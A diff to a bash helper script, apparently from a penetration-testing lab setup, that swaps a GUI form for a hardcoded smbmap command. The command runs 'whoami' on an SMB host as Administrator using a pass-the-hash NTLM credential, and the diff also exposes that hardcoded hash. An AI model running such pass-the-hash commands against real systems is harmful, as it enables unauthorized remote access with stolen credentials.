@@ -1,21 +1,9 @@
 #!/bin/bash
 
 : '
-smbmap: Execute command on smb as user with NTLM hash.
+smbmap: Execute 'whoami' on smb as Administrator with NTLM hash.
 '
-# Generate GUI form items (label, type (optional: default text), name, default (optional))
-IP_FIELD=$(form_item  "IP address" "ip")
-USERNAME_FIELD=$(form_item  "Username" "username" "Administrator")
-HASH_FIELD=$(form_item  "hash" "hash")
-CMD_FIELD=$(form_item  "cmd" "cmd" "whoami")
 
-# Generate GUI form
-generate_form "${IP_FIELD}" "${USERNAME_FIELD}" "${HASH_FIELD}" "${CMD_FIELD}"
+source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
 
-IP=${form_data["ip"]}
-USERNAME=${form_data["username"]}
-HASH=${form_data["hash"]}
-CMD=${form_data["cmd"]}
-
-paste_command "smbmap -H ${IP}  -u '${USERNAME}' -p '${HASH}' -x '${CMD}"
-xdotool key Return
+paste_command "smbmap -H 172.16.8.20  -u 'Administrator' -p 'aad3b435b51404eeaad3b435b51404ee:0e20798f695ab0d04bc138b22344cea8' -x whoami"
